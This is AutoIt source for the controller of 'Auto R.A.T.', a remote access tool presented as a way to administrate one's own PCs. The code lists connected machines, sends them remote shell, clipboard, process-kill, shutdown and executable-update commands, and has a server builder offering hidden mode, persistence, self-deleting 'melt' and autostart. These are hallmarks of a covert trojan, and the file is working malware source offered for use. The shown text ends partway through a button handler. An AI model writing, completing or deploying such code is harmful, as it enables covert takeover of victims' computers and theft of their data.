#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_icon=Rubik-Pocket-Cube.ico
#AutoIt3Wrapper_outfile=..\autorat.exe
#AutoIt3Wrapper_Compression=4
#AutoIt3Wrapper_Res_Comment=Administrate your other PCs
#AutoIt3Wrapper_Res_Description=Auto R.A.T. 0.12 Beta V4
#AutoIt3Wrapper_Res_Fileversion=0.12.0.0
#AutoIt3Wrapper_Res_LegalCopyright=by Snify
#AutoIt3Wrapper_Run_Obfuscator=y
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
_Singleton ("HIDEME", 0)
#include <ButtonConstants.au3>
#include <EditConstants.au3>
#Include <GuiButton.au3>
#include <GUIConstantsEx.au3>
#include <GuiStatusBar.au3>
#include <ListViewConstants.au3>
#include <StaticConstants.au3>
#include <TabConstants.au3>
#include <WindowsConstants.au3>
#include <GUILISTVIEW.au3>
#include <array.au3>
#include <GUIConstantsEx.au3>
#include <TreeViewConstants.au3>
#include <WindowsConstants.au3>
#include <guitreeview.au3>
#include <winapi.au3>
#include <guicombobox.au3>
;~ #include <Ftp.au3>
#include <GUIConstantsEx.au3>
#include <ListViewConstants.au3>
#include <WindowsConstants.au3>
#Include <GuiListBox.au3>
#Include <Misc.au3>
#include <GUIConstants.au3>
#include <EditConstants.au3>
#include <Constants.au3>
#include <WindowsConstants.au3>
#include <GuiEdit.au3>
#include <GuiStatusBar.au3>
#include <GuiConstantsEx.au3>
#include <WindowsConstants.au3>
#include <ScrollBarConstants.au3>
; ============================================== 3rd Files ===================================================



DirCreate(@TempDir & "\AutoRAT")
FileInstall("connect.ico", @TempDir & "\AutoRAT\connect.ico", 1)
FileInstall("settings.ico", @TempDir & "\AutoRAT\settings.ico", 1)
FileInstall("brick_edit.ico", @TempDir & "\AutoRAT\brick_edit.ico", 1)
FileInstall ("rubiks-cube.jpg", @TempDir & "\AutoRAT\rubiks-cube.jpg", 1)
FileInstall ("connection.ico", @TempDir & "\AutoRAT\connection.ico", 1)
FileInstall ("about.ico", @TempDir & "\AutoRAT\about.ico", 1)
FileInstall ("eula.txt", @TempDir & "\AutoRAT\eula.txt", 1)
FileInstall ("linkdeactivated.wav", @TempDir & "\AutoRAT\linkdeactivated.wav", 1)
FileInstall ("linkactivated.wav", @TempDir & "\AutoRAT\linkactivated.wav", 1)
FileInstall ("userleft.wav", @TempDir & "\AutoRAT\userleft.wav", 1)
FileInstall ("userjoined.wav", @TempDir & "\AutoRAT\userjoined.wav", 1)
FileInstall ("process.ico", @TempDir&"\AutoRAT\process.ico", 1)
FileInstall ("Warning.ico", @TempDir&"\AutoRAT\Warning.ico", 1)
FileInstall ("Info.ico", @TempDir&"\AutoRAT\Info.ico", 1)
FileInstall ("Warning.ico", @TempDir&"\AutoRAT\Warning.ico", 1)
FileInstall ("Questionmark.ico", @TempDir&"\AutoRAT\Questionmark.ico", 1)
FileInstall ("Stop.ico", @TempDir&"\AutoRAT\Stop.ico", 1)



; ========================================= OPTIONS ===========================================


; ================ SET VERSION ===============
$version = "Auto R.A.T. 0.12 Beta V4"



Opt("TrayOnEventMode", 1) ; For TrayMode ;)
Opt("TrayMenuMode", 1)
Opt("OnExitFunc", "endscript")
Opt("WinTitleMatchMode", 4)
$taskbar_pos = WinGetPos("classname=Shell_TrayWnd")
$taskbar_pos = $taskbar_pos[3]
Opt("WinTitleMatchMode", 2)

; ===================================== CONNECTION INTERVALL and definde mainsocket ======================


Dim $connections[999]
Dim $mainsocket = -1
Dim $decline = 0
Dim $accept = 0
Dim $connectionwindow[999]
Dim $exitclipboard = -1
Dim $getclipboard = -1
Dim $setclipboard = -1
Dim $refreshprocesses = -1
Dim $closeprocess = -1
Dim $msgboxcontext = -1
Dim $Notify
Dim $notifydisconnectwindow
Global $refreshprocesses[1]
Global $processstatus
Global $closeprocess[1]
Global $msgsend[1]
Global $clipapply[1]
Global $msgtest[1]
Global $cmdinput[1]
Global $zz
Global $z
Global $yy
Global $processpath[1]
Global $WS_VSCROL
Global $hideme = "HIDEME"
Global $cmdedit[1]
; ===================================== START GUI ==========================================================



; ====================================== EULA =============================================

$eula = GUICreate("Auto R.A.T. EULA", 635, 412, -1, -1, BitOR($WS_MINIMIZEBOX,$WS_CAPTION,$WS_POPUP,$WS_GROUP,$WS_BORDER,$WS_CLIPSIBLINGS))
$Edit1 = GUICtrlCreateEdit("", 8, 8, 609, 329, BitOR($ES_AUTOVSCROLL,$ES_AUTOHSCROLL,$ES_WANTRETURN,$WS_GROUP,$WS_VSCROLL))
GUICtrlSetData ($Edit1, FileRead (@TempDir & "\AutoRAT\eula.txt"))
$accept = GUICtrlCreateButton("I agree", 56, 352, 155, 41, $WS_GROUP, BitOR($WS_EX_CLIENTEDGE,$WS_EX_STATICEDGE))
$decline = GUICtrlCreateButton("I disagree", 416, 352, 155, 41, $WS_GROUP, BitOR($WS_EX_CLIENTEDGE,$WS_EX_STATICEDGE))
if IniRead ("settings.ini", "CLIENT SETTINGS", "EULA", 1) = 1 Then
GUISetState(@SW_SHOW)
Else
GUIDelete ($eula)
EndIf


;====================================Update Funktion=================================


#Region ### START Koda GUI section ### Form=C:\Dokumente und Einstellungen\Administrator\Desktop\Programmier Ordner\AutoRAT\NEUE GUI\Form1.kxf
$Form1 = GUICreate($version, 600, 400, -1, -1)
;~ $Form1 = GUICreate($version, 583, 321, -1, -1)
$contextmenu = GUICtrlCreateContextMenu()
$Tab1 = GUICtrlCreateTab(0, 0, 599, 380)
GUICtrlSetResizing(-1, $GUI_DOCKWIDTH+$GUI_DOCKHEIGHT)
$TabSheet1 = GUICtrlCreateTabItem("Connections")
GUICtrlSetImage (-1, @TempDir & "\AutoRAT\connect.ico")
GUICtrlSetState(-1,$GUI_SHOW)
$ListView1 = GUICtrlCreateListView("Name|Computername/User|IP|OS|Socket|Ping", 4, 25, 590, 350, -1, BitOR($WS_EX_CLIENTEDGE,$WS_EX_STATICEDGE,$LVS_EX_GRIDLINES,$LVS_EX_SUBITEMIMAGES,$LVS_EX_TRACKSELECT,$LVS_EX_HEADERDRAGDROP,$LVS_EX_FULLROWSELECT))
GUICtrlSetImage(-1, @TempDir & "\AutoRAT\connection.ico")
GUICtrlSendMsg(-1, $LVM_SETCOLUMNWIDTH, 0, 100)
GUICtrlSendMsg(-1, $LVM_SETCOLUMNWIDTH, 1, 125)
GUICtrlSendMsg(-1, $LVM_SETCOLUMNWIDTH, 2, 120)
GUICtrlSendMsg(-1, $LVM_SETCOLUMNWIDTH, 3, 80)
GUICtrlSendMsg(-1, $LVM_SETCOLUMNWIDTH, 4, 80)
GUICtrlSendMsg(-1, $LVM_SETCOLUMNWIDTH, 5, 65)

; ============================= CONTEXT MENU ===============================
$buttoncontext = GUICtrlCreateContextMenu($ListView1)
;~ $filemanager = GUICtrlCreateMenuItem("File Manager", $buttoncontext)
$clipboardmanager = GUICtrlCreateMenuItem("Clipboard Manager", $buttoncontext)
$getping = GUICtrlCreateMenuItem("Ping", $buttoncontext)
$remoteshell = GUICtrlCreateMenuItem("Remote Shell", $buttoncontext)
GUICtrlCreateMenuItem("", $buttoncontext)
$info = GUICtrlCreateMenu("System Information", $buttoncontext)
$process = GUICtrlCreateMenuItem("Processes", $info)
;~ GUICtrlCreateMenuItem("Installed Applications", $info)
;~ GUICtrlCreateMenuItem("Server Settings", $info)
;~ GUICtrlCreateMenuItem("Window List", $info)
;~ GUICtrlCreateMenuItem("Connection Info", $info)
$hibernate = GUICtrlCreateMenu("Miscellaneous", $buttoncontext)
$msgboxcontext = GUICtrlCreateMenuItem ("Send Message", $hibernate)
$shutdown = GUICtrlCreateMenuItem("Shutdown", $hibernate)
$restart = GUICtrlCreateMenuItem("Restart", $hibernate)
$logoff = GUICtrlCreateMenuItem("Logoff", $hibernate)
$standby = GUICtrlCreateMenuItem("Standby", $hibernate)
$settings = GUICtrlCreateMenu("Server Settings", $buttoncontext)
$rename = GUICtrlCreateMenuItem("Rename Server", $settings)
$uninstall = GUICtrlCreateMenuItem("Uninstall Server", $settings)
$closeserver = GUICtrlCreateMenuItem("Close Server", $settings)
$reconnect = GUICtrlCreateMenuItem("Reconnect Server", $settings)
$newdnsip = GUICtrlCreateMenuItem("New DNS/IP", $settings)
$updateserver = GUICtrlCreateMenuItem("Update Server", $settings)

; ============================== CONTEXT MENU END =================================================

$TabSheet2 = GUICtrlCreateTabItem("Options")
GUICtrlSetImage (-1, @TempDir & "\AutoRAT\settings.ico")
$Group1 = GUICtrlCreateGroup("Connection options", 30, 80, 297, 217)
$Input1 = GUICtrlCreateInput("", 200, 120, 89, 21)
$Input2 = GUICtrlCreateInput("", 200, 177, 89, 21)
$Label1 = GUICtrlCreateLabel("Listen on Port:", 60, 130, 100, 17)
GUICtrlSetFont(-1, 8, 800, 0, "MS Sans Serif")
$Label2 = GUICtrlCreateLabel("Incoming Password:", 60, 180, 117, 17)
GUICtrlSetFont(-1, 8, 800, 0, "MS Sans Serif")
$Button1 = GUICtrlCreateButton("Start listen", 60, 240, 75, 25, $WS_GROUP)
$Button2 = GUICtrlCreateButton("Stop listen", 214, 240, 75, 25, $WS_GROUP)
GUICtrlCreateGroup("", -99, -99, 1, 1)
$Group2 = GUICtrlCreateGroup("Notification", 340, 80, 233, 217)
$Checkbox1 = GUICtrlCreateCheckbox("Notify on new connection", 380, 130, 177, 17)
$Checkbox2 = GUICtrlCreateCheckbox("Notify on disconnection", 380, 185, 161, 17)
$Checkbox3 = GUICtrlCreateCheckbox("Notify with Sound", 380, 240, 110, 17)
GUICtrlCreateGroup("", -99, -99, 1, 1)
$TabSheet3 = GUICtrlCreateTabItem("Server Builder")
GUICtrlSetImage (-1, @TempDir & "\AutoRAT\brick_edit.ico")
$Group3 = GUICtrlCreateGroup("Connect to: ", 24, 70, 225, 241)
$ListView2 = GUICtrlCreateListView("DNS/IP|Port", 40, 94, 186, 94)
GUICtrlSendMsg(-1, $LVM_SETCOLUMNWIDTH, 0, 130)
GUICtrlSendMsg(-1, $LVM_SETCOLUMNWIDTH, 1, 50)
$Button3 = GUICtrlCreateButton("Add", 40, 206, 75, 25, $WS_GROUP)
$Button4 = GUICtrlCreateButton("Delete", 152, 206, 75, 25, $WS_GROUP)
$Label20 = GUICtrlCreateLabel("Server Mutex: ", 40, 254, 73, 17)
$Label21 = GUICtrlCreateLabel("Server Password:", 40, 278, 87, 17)
$Input5 = GUICtrlCreateInput("", 152, 254, 81, 21)
$Input6 = GUICtrlCreateInput("", 152, 278, 81, 21)
GUICtrlCreateGroup("", -99, -99, 1, 1)
$Group4 = GUICtrlCreateGroup("Options", 264, 70, 297, 185)
$Checkbox4 = GUICtrlCreateCheckbox("Autostart", 280, 94, 97, 17)
$Checkbox5 = GUICtrlCreateCheckbox("Install Server", 392, 94, 97, 17)
$Input3 = GUICtrlCreateInput("", 472, 126, 73, 21)
$Label17 = GUICtrlCreateLabel("Filename:", 392, 129, 58, 17)
GUICtrlSetFont(-1, 8, 800, 0, "MS Sans Serif")
$Combo1 = GUICtrlCreateCombo("", 392, 214, 153, 25)
GUICtrlSetData(-1, "Windows|Desktop|Appdata|Temp|MyDocuments|System32|OWNPATH (type in your path)")
$Label18 = GUICtrlCreateLabel("Install Server to: ", 392, 190, 102, 17)
GUICtrlSetFont(-1, 8, 800, 4, "MS Sans Serif")
$Label19 = GUICtrlCreateLabel("Foldername:", 392, 158, 73, 17)
GUICtrlSetFont(-1, 8, 800, 0, "MS Sans Serif")
$Input4 = GUICtrlCreateInput("", 472, 158, 73, 21)
$Checkbox6 = GUICtrlCreateCheckbox("Hidden Server", 280, 126, 97, 17)
$Checkbox7 = GUICtrlCreateCheckbox("Persistant", 280, 158, 97, 17)
$Checkbox8 = GUICtrlCreateCheckbox("Melt Server", 280, 190, 97, 17)
$Checkbox9 = GUICtrlCreateCheckbox("Visible Mode", 280, 222, 97, 17)
GUICtrlCreateGroup("", -99, -99, 1, 1)
$Button5 = GUICtrlCreateButton("---> Build Server <---", 264, 262, 299, 49, $WS_GROUP, BitOR($WS_EX_CLIENTEDGE,$WS_EX_STATICEDGE))
$TabSheet4 = GUICtrlCreateTabItem("About")
GUICtrlSetImage (-1, @TempDir & "\AutoRAT\about.ico")
$Pic1 = GUICtrlCreatePic(@TempDir & "\AutoRAT\rubiks-cube.jpg", 16, 62, 260, 252)
$Label3 = GUICtrlCreateLabel($version, 304, 62, 252, 33)
GUICtrlSetFont(-1, 18, 800, 0, "Sylfaen")
GUICtrlSetColor(-1, 0x008080)
$Label4 = GUICtrlCreateLabel("coded by Snify in pure Autoit", 336, 110, 168, 17)
GUICtrlSetFont(-1, 8, 800, 0, "MS Sans Serif")
GUICtrlCreateTabItem("")
$StatusBar1 = _GUICtrlStatusBar_Create($Form1)

;=================== READ/WRITE SETTINGS.INI ===============================

if FileExists ("settings.ini") = 0 Then
	$inihandle = FileOpen ("settings.ini", 1)
	FileWrite ($inihandle, "[CLIENT SETTINGS]")
	FileClose ($inihandle)
	IniWrite ("settings.ini", "CLIENT SETTINGS", "LISTENPORT", "") ; DONE
	IniWrite ("settings.ini", "CLIENT SETTINGS", "INCOMINGPW", "") ; DONE
	IniWrite ("settings.ini", "CLIENT SETTINGS", "NOTIFYCONNECT", "") ; DONE
	IniWrite ("settings.ini", "CLIENT SETTINGS", "NOTIFYDISCONNECT", "") ; DONE
	IniWrite ("settings.ini", "CLIENT SETTINGS", "NOTIFYSOUND", "") ; DONE
	IniWrite ("settings.ini", "SERVER SETTINGS", "DNSIP", "") ; DONE
	IniWrite ("settings.ini", "SERVER SETTINGS", "PORT", "") ; DONE
	IniWrite ("settings.ini", "SERVER SETTINGS", "MUTEX", "") ; DONE
	IniWrite ("settings.ini", "SERVER SETTINGS", "SERVERPW", "") ; DONE
	IniWrite ("settings.ini", "SERVER SETTINGS", "AUTOSTART", "") ; DONE
	IniWrite ("settings.ini", "SERVER SETTINGS", "HIDDEN", "") ; DONE
	IniWrite ("settings.ini", "SERVER SETTINGS", "PERSISTANT", "") ; DONE
	IniWrite ("settings.ini", "SERVER SETTINGS", "MELT", "") ; DONE
	IniWrite ("settings.ini", "SERVER SETTINGS", "VISIBLE", "") ; DONE
	IniWrite ("settings.ini", "SERVER SETTINGS", "INSTALL", "") ; DONE
	IniWrite ("settings.ini", "SERVER SETTINGS", "FILENAME", "") ; DONE
	IniWrite ("settings.ini", "SERVER SETTINGS", "FOLDERNAME", "") ; DONE
	IniWrite ("settings.ini", "SERVER SETTINGS", "INSTALLPATH", "") ; DONE
Else



if IniRead ("settings.ini", "CLIENT SETTINGS", "NOTIFYCONNECT", 0) = 1 Then
	GUICtrlSetState ($Checkbox1, $GUI_CHECKED)
EndIf
if IniRead ("settings.ini", "CLIENT SETTINGS", "NOTIFYDISCONNECT", 0) = 1 Then
	GUICtrlSetState ($Checkbox2, $GUI_CHECKED)
EndIf
if IniRead ("settings.ini", "CLIENT SETTINGS", "NOTIFYSOUND", 0) = 1 Then
	GUICtrlSetState ($Checkbox3, $GUI_CHECKED)
EndIf

GUICtrlSetData ($Input1, IniRead("settings.ini","CLIENT SETTINGS", "LISTENPORT", ""))
GUICtrlSetData ($Input2, IniRead("settings.ini","CLIENT SETTINGS", "INCOMINGPW", ""))
GUICtrlSetData ($Input3, IniRead("settings.ini","SERVER SETTINGS", "FILENAME", ""))
GUICtrlSetData ($Input4, IniRead("settings.ini","SERVER SETTINGS", "FOLDERNAME", ""))
GUICtrlSetData ($Input5, IniRead("settings.ini","SERVER SETTINGS", "MUTEX", ""))
GUICtrlSetData ($Input6, IniRead("settings.ini","SERVER SETTINGS", "SERVERPW", ""))
if IniRead ("settings.ini", "SERVER SETTINGS", "INSTALLPATH", "") <> "" Then
_GUICtrlComboBox_AddString ($Combo1, IniRead ("settings.ini", "SERVER SETTINGS", "INSTALLPATH", ""))
EndIf
$indeex = _GUICtrlListView_AddItem ($ListView2, IniRead("settings.ini", "SERVER SETTINGS", "DNSIP", ""))
_GUICtrlListView_SetItem ($ListView2, IniRead("settings.ini", "SERVER SETTINGS", "PORT", ""), $indeex, 1)

If IniRead ("settings.ini", "SERVER SETTINGS", "AUTOSTART", "") = 1 Then
	GUICtrlSetState ($Checkbox4, $GUI_CHECKED)
EndIf

If IniRead ("settings.ini", "SERVER SETTINGS", "HIDDEN", "") = 1 Then
	GUICtrlSetState ($Checkbox6, $GUI_CHECKED)
EndIf

If IniRead ("settings.ini", "SERVER SETTINGS", "PERSISTANT", "") = 1 Then
	GUICtrlSetState ($Checkbox7, $GUI_CHECKED)
EndIf

If IniRead ("settings.ini", "SERVER SETTINGS", "MELT", "") = 1 Then
	GUICtrlSetState ($Checkbox8, $GUI_CHECKED)
EndIf

If IniRead ("settings.ini", "SERVER SETTINGS", "VISIBLE", "") = 1 Then
	GUICtrlSetState ($Checkbox9, $GUI_CHECKED)
EndIf

If IniRead ("settings.ini", "SERVER SETTINGS", "INSTALL", "") = 1 Then
	GUICtrlSetState ($Checkbox5, $GUI_CHECKED)
EndIf
EndIf

if IniRead ("settings.ini", "CLIENT SETTINGS", "EULA", 1) = 0 Then
	$euladecline = 1
	$eulaaccept = 1
GUISetState(@SW_SHOW)
EndIf
$timer = ""
$time = 0
$timerinit = 0
$time2 = 0
$timerinit2 = 0
#EndRegion ### END Koda GUI section ###

; ========================================================== END GUI ==================================


; ================================================== GETMSG ==================================================


; ===== GET WINHANDLE =====
$winhandle = WinGetHandle($Form1)


; ===== DUMMY VAR ====
$l = 0


While (WinExists($Form1))


if $timerinit = 1 Then
if TimerDiff ($time) > 3000 Then
	DllCall("user32.dll", "int", "AnimateWindow", "hwnd", $Notify, "int", 500, "long", 0x00050004)
	while 1
	$disconnecthandle = WinGetHandle ("Notify")
	if $disconnecthandle = "" and @error = 1 Then ExitLoop
	GUIDelete ($disconnecthandle)
	WEnd

	$time = 0
	$timerinit = 0
EndIf
EndIf

if $timerinit2 = 1 Then
if TimerDiff ($time2) > 3000 Then
	DllCall("user32.dll", "int", "AnimateWindow", "hwnd", $notifydisconnectwindow, "int", 500, "long", 0x00050004)
	while 1
	$disconnecthandle = WinGetHandle ("Notifydisconnect")
	if $disconnecthandle = "" and @error = 1 Then ExitLoop
	GUIDelete ($disconnecthandle)
	WEnd
	$time2 = 0
	$timerinit2 = 0
EndIf
EndIf

   Global $nMsg
	Global $z
	Global $zz
	Global $yy


	$nMsg = GUIGetMsg(TRUE)
	Switch $nMsg[0]

; ================== CLOSE GUI ==============

			Case $GUI_EVENT_CLOSE
			if WinActive ($winhandle) = 1 then Exit
			if WinExists ("Remote-Shell") Then
				$title = WinGetTitle ("Remote-Shell")
				for $i = 1 to StringLen ($title)
					if StringRight ($title, $i) = 0 Then ExitLoop
				Next
				TCPSend (StringRight ($title, $i-1), "CLOSECMD")
			EndIf
			GUIDelete ($nMsg[1])


; ========== DECLINE ==============

	Case $decline
		Exit

; ========== ACCEPT =============

		Case $accept
		GUIDelete ($eula)
		GUISetState (@SW_SHOW, $Form1)
		IniWrite ("settings.ini", "CLIENT SETTINGS", "EULA", 0)

;	===================================== UPDATE SERVER =====================================

	Case $updateserver
		if _GUICtrlListView_GetSelectedCount($ListView1) = 0 Then
			ContinueLoop
		EndIf
		$dummy = _GUICtrlListView_GetSelectedIndices($ListView1, True)
		$file_path = FileOpenDialog("Select File",@ScriptDir,"Executeable files (*.exe)|All (*.*)",1) ; durch .exe ersetzen
		if @error Then
			ContinueLoop
			MsgBox(16,"ERROR","An error occured!")
		EndIf
		_GUICtrlListView_GetItemText($ListView1, $dummy[1], 4)
		$socket = _GUICtrlListView_GetItemText($ListView1, $dummy[1], 4)
		Global $choice = 0,$paket_len,$paket_rest
		#Region ### START Koda GUI section ### Form= ; GUI: Upload settings
		$Form1us = GUICreate("Upload settings", 215, 87, 200, 150)
		$Label1us = GUICtrlCreateLabel("Please select a package size.", 5, 2, 170, 14)
		$Label2us = GUICtrlCreateLabel("It influences the package count and"&@CRLF&"upload speed.", 5, 16, 187, 30)
		$Radio1us = GUICtrlCreateRadio("128 Bytes", 5, 48, 65, 17)
		$Radio2us = GUICtrlCreateRadio("256 Bytes", 5, 64, 65, 17)
		$Radio3us = GUICtrlCreateRadio("512 Bytes", 80, 48, 65, 17)
;~ 		$Radio4us = GUICtrlCreateRadio("768 Bytes", 80, 64, 65, 17)
		GUISetState(@SW_SHOW)
		#EndRegion ### END Koda GUI section ###
		While $choice <> 1
			If GUICtrlRead($Radio1us) = 1 Or GUICtrlRead($Radio2us) = 1 Or GUICtrlRead($Radio3us) = 1 Then;Or GUICtrlRead($Radio4us) = 1 Then
				If GUICtrlRead($Radio1us) = 1 Then
					$paket_len = 128
					$choice = 1
				EndIf
				If GUICtrlRead($Radio2us) = 1 Then
					$paket_len = 256
					$choice = 1
				EndIf
				If GUICtrlRead($Radio3us) = 1 Then
					$paket_len = 512
					$choice = 1
				EndIf
;~ 				If GUICtrlRead($Radio4us) = 1 Then
;~ 					$paket_len = 768
;~ 					$choice = 1
;~ 				EndIf
				GUIDelete($Form1us)
			EndIf
		WEnd
		If $choice = 0 Then $paket_len = 64
		ProgressOn("Transmission status","Sending update","",0,0)
		Global $bytes
		$size = FileGetSize($file_path)
		$paket_counter = Round($size/$paket_len,0)+1
		$file = _WinAPI_CreateFile($file_path,2,2)
		$pos = DllStructCreate("byte["&$paket_len&"]")
		TCPSend ($socket,"UPDATE="&$paket_counter&"/"&$size)
		do
			$answer = TCPRecv ($socket,24)
		Until $answer = "UPDATEOK"
		For $i=0 To $size Step $paket_len
			ProgressSet((100/$size)*$i,"sent "&$i&" Bytes of "&$size&" Bytes.")
			_WinAPI_SetFilePointer($file,$i)
			_WinAPI_ReadFile($file,DllStructGetPtr($pos),$paket_len,$bytes)
			$file_binary = DllStructGetData($pos, 1)
			TCPSend($socket,"SOP"&$file_binary&"EOP")
			do
				$answer = TCPRecv($socket,10)
			Until $answer = "POK"
		Next
		TCPSend($socket,"EOU")
		do
			$answer = TCPRecv($socket,10)
		Until $answer = "PTDONE"
		_WinAPI_CloseHandle($file)
		ProgressSet(100,"sent "&$size&" Bytes of "&$size&" Bytes.")
		MsgBox(0,"Update done!","Upload successful!")
		ProgressOff()


; ================================================== MINIMIZE TO TRAY ==================================================

	Case $GUI_EVENT_MINIMIZE
		if WinActive ($winhandle) = 1 then ContinueLoop
		GUISetState(@SW_HIDE, $Form1)
		TrayTip($version, _GUICtrlListView_GetItemCount($ListView1) & " Users are connected", 5, 1)
		$tray = TrayCreateItem("SHOW")
		TrayItemSetOnEvent(-1, "SHOW")
		$tray3 = TrayCreateItem("")
		$tray2 = TrayCreateItem("EXIT")
		TrayItemSetOnEvent(-1, "CLOSE")


		Case $newdnsip ; NEW DNS IP
		If _GUICtrlListView_GetSelectedCount($ListView1) = 0 Then
				ContinueLoop
		EndIf
		$eingabe = InputBox("DNS/IP", "Please Enter a new DNS/IP:", "", "", 150, 120)
		If $eingabe = "" Or @error Then
				ContinueLoop
		EndIf
		$dummy = _GUICtrlListView_GetSelectedIndices($ListView1, True)
		TCPSend(_GUICtrlListView_GetItemText($ListView1, $dummy[1], 4), "DNSIP=" & $eingabe)
		_GUICtrlListView_DeleteItem(GUICtrlGetHandle($ListView1), $dummy[1])
		WinSetTitle($winhandle, "", $version&"            " & _GUICtrlListView_GetItemCount($ListView1) & " Users are connected")

	Case $restart ; RESTART
		If _GUICtrlListView_GetSelectedCount($ListView1) = 0 Then
			ContinueLoop
		EndIf
		$dummy = _GUICtrlListView_GetSelectedIndices($ListView1, True)
		TCPSend(_GUICtrlListView_GetItemText($ListView1, $dummy[1], 4), "RESTART")

	Case $logoff ; LOGOFF
		If _GUICtrlListView_GetSelectedCount($ListView1) = 0 Then
			ContinueLoop
		EndIf
		$dummy = _GUICtrlListView_GetSelectedIndices($ListView1, True)
		TCPSend(_GUICtrlListView_GetItemText($ListView1, $dummy[1], 4), "LOGOFF")

	Case $standby ; Standby
		If _GUICtrlListView_GetSelectedCount($ListView1) = 0 Then
			ContinueLoop
		EndIf
		$dummy = _GUICtrlListView_GetSelectedIndices($ListView1, True)
		TCPSend(_GUICtrlListView_GetItemText($ListView1, $dummy[1], 4), "STANDBY")

	Case $uninstall ; UNINSTALL
		If _GUICtrlListView_GetSelectedCount($ListView1) = 0 Then
			ContinueLoop
		EndIf
		$dummy = _GUICtrlListView_GetSelectedIndices($ListView1, True)
		$frage = MsgBox(36, "Question", "Are you sure you want to uninstall the server?")
		If $frage = 7 Then ContinueLoop
		TCPSend(_GUICtrlListView_GetItemText($ListView1, $dummy[1], 4), "UNINSTALL")
;~ 		_GUICtrlListView_DeleteItem (GUICtrlGetHandle($ListView1), $dummy[1])

	Case $shutdown ; SHUTDOWN
		If _GUICtrlListView_GetSelectedCount($ListView1) = 0 Then
			ContinueLoop
		EndIf
		$dummy = _GUICtrlListView_GetSelectedIndices($ListView1, True)
		TCPSend(_GUICtrlListView_GetItemText($ListView1, $dummy[1], 4), "SHUTDOWN")

	Case $closeserver
		if _GUICtrlListView_GetSelectedCount($ListView1) = 0 Then
			ContinueLoop
		EndIf
		$dummy = _GUICtrlListView_GetSelectedIndices($ListView1, True)
		$frage = MsgBox(36, "Question", "Are you sure you want to close the server?")
		If $frage = 7 Then ContinueLoop
		TCPSend(_GUICtrlListView_GetItemText($ListView1, $dummy[1], 4), "EXIT")
		_GUICtrlListView_DeleteItem(GUICtrlGetHandle($ListView1), $dummy[1])
		WinSetTitle($winhandle, "", $version&"             " & _GUICtrlListView_GetItemCount($ListView1) & " Users are connected")
		$tempindex = _ArraySearch($connections, _GUICtrlListView_GetItemText($ListView1, $dummy[1], 4))
		If @error Then ContinueLoop 2
		$connections[$tempindex] = ""
		ContinueLoop
		WinSetTitle($winhandle, "", $version&"             " & _GUICtrlListView_GetItemCount($ListView1) & " Users are connected")

	Case $reconnect
		If _GUICtrlListView_GetSelectedCount($ListView1) = 0 Then
			ContinueLoop
		EndIf
		$dummy = _GUICtrlListView_GetSelectedIndices($ListView1, True)
		TCPSend(_GUICtrlListView_GetItemText($ListView1, $dummy[1], 4), "RECONNECT")
		_GUICtrlListView_DeleteItem(GUICtrlGetHandle($ListView1), $dummy[1])

	Case $rename
		If _GUICtrlListView_GetSelectedCount($ListView1) = 0 Then
			ContinueLoop
		EndIf
		$eingabe = InputBox("Name", "Please Enter a Name:", "", "", 150, 120)
		If $eingabe = "" Or @error Then
			ContinueLoop
		EndIf
		$dummy = _GUICtrlListView_GetSelectedIndices($ListView1, True)
		TCPSend(_GUICtrlListView_GetItemText($ListView1, $dummy[1], 4), "NAME=" & $eingabe)
		_GUICtrlListView_SetItem($ListView1, $eingabe, $dummy[1])

	case $process
		If _GUICtrlListView_GetSelectedCount($ListView1) = 0 Then
			ContinueLoop
		EndIf
		$z = UBound($refreshprocesses)
		ReDim $refreshprocesses[$z + 1]
		$refreshprocesses[0] = $z
		$yy = UBound($processpath)
		ReDim $processpath[$yy + 1]
		$processpath[0] = $yy
		$zz = UBound($closeprocess)
		ReDim $closeprocess[$zz + 1]
		$closeprocess[0] = $zz
		_makeprocessgui ()



; =========================== START LISTEN ==============================

	Case $Button1 ; LISTEN


; ========================= WRITE SETTINGS =================================



		IniWrite ("settings.ini", "CLIENT SETTINGS", "LISTENPORT", GUICtrlRead($Input1))
		IniWrite ("settings.ini", "CLIENT SETTINGS", "INCOMINGPW", GUICtrlRead($Input2))

		if GUICtrlRead ($Checkbox1) = 4 then
		IniWrite ("settings.ini", "CLIENT SETTINGS", "NOTIFYCONNECT", "0")
		Else
		IniWrite ("settings.ini", "CLIENT SETTINGS", "NOTIFYCONNECT",GUICtrlRead ($Checkbox1))
		EndIf

		if GUICtrlRead ($Checkbox2) = 4 then
		IniWrite ("settings.ini", "CLIENT SETTINGS", "NOTIFYDISCONNECT", "0")
		Else
		IniWrite ("settings.ini", "CLIENT SETTINGS", "NOTIFYDISCONNECT",GUICtrlRead ($Checkbox2))
		EndIf

		if GUICtrlRead ($Checkbox3) = 4 then
		IniWrite ("settings.ini", "CLIENT SETTINGS", "NOTIFYSOUND", "0")
		Else
		IniWrite ("settings.ini", "CLIENT SETTINGS", "NOTIFYSOUND",GUICtrlRead ($Checkbox3))
		EndIf

; ============ END WRITE SETTINGS =========================


		If GUICtrlRead($Input1) = "" Or StringIsDigit(GUICtrlRead($Input1)) = 0 Then
		MsgBox(16, "ERROR", "Please enter a valid Port.")
			ContinueLoop
		EndIf
		TCPStartup()
		$ipadress = @IPAddress1
		$mainsocket = TCPListen($ipadress, GUICtrlRead($Input1), 999)
		If $mainsocket = -1 Then
			_GUICtrlStatusBar_SetText($StatusBar1, "ERROR. Port is already in use.")
			TCPShutdown()
			$mainsocket = -1
			ContinueLoop
		EndIf
		_GUICtrlStatusBar_SetText($StatusBar1, "Listen on Port " & GUICtrlRead($Input1) & ". Waiting for connections...")
		For $k = 0 To UBound($connections) - 1
			$connections[$k] = ""
		Next
		if GUICtrlRead ($Checkbox3) = 1 then SoundPlay (@TempDir & "\AutoRAT\linkactivated.wav", 0)



	Case $Button2
		TCPShutdown()
		_GUICtrlStatusBar_SetText($StatusBar1, "Listen aborted.")
		_GUICtrlListView_DeleteAllItems(GUICtrlGetHandle($ListView1))
		WinSetTitle($winhandle, "", $version&"             " & _GUICtrlListView_GetItemCount($ListView1) & " Users are connected")
		$mainsocket = -1
		if GUICtrlRead($Checkbox3) = 1 then SoundPlay (@TempDir & "\AutoRAT\linkdeactivated.wav", 0)

; ===================== END LISTEN ===============================

	Case $Button3 ; ------------------> ADD DNS/IP
		If _GUICtrlListView_GetItemCount($ListView2) >= 1 Then
			MsgBox(16, "Error", "In this Version you can only add one IP/DNS.")
			ContinueLoop
		EndIf
